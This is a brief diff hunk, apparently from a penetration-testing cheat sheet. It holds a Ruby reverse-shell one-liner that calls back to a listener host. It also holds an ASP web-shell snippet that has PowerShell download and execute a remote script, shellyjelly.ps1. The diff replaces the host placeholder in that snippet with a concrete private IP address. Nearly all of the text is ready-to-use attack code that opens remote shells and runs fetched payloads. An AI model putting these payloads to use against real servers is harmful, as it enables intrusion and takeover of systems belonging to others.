@@ -5924,7 +5924,7 @@ ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh 
 <!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
 <%
 Set s = CreateObject("WScript.Shell")
-Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://<LHOST>/shellyjelly.ps1')")
+Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://192.168.45.194/shellyjelly.ps1')")
 o = cmd.StdOut.Readall()
 Response.write(o)
 %>
